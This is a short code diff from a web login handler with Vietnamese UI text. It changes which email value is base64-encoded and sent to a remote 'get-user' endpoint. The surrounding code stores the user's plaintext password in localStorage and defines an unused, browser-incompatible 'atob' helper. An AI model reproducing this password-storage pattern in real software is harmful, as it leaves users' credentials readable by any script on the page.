@@ -49,7 +49,7 @@ window.addEventListener("DOMContentLoaded", () => {
       localStorage.setItem("userPassword", loginFormdata.loginPassword);
       alert('Đăng nhập thành công!');
       const atob = (base64) => Buffer.from(base64, 'base64').toString('binary');
-      const bytes = new TextEncoder().encode(email2);
+      const bytes = new TextEncoder().encode(lastUser.email);
       const base64 = btoa(String.fromCharCode(...bytes));
       fetch('https://dssc.hagotree.site/get-user', {
           method: 'POST',
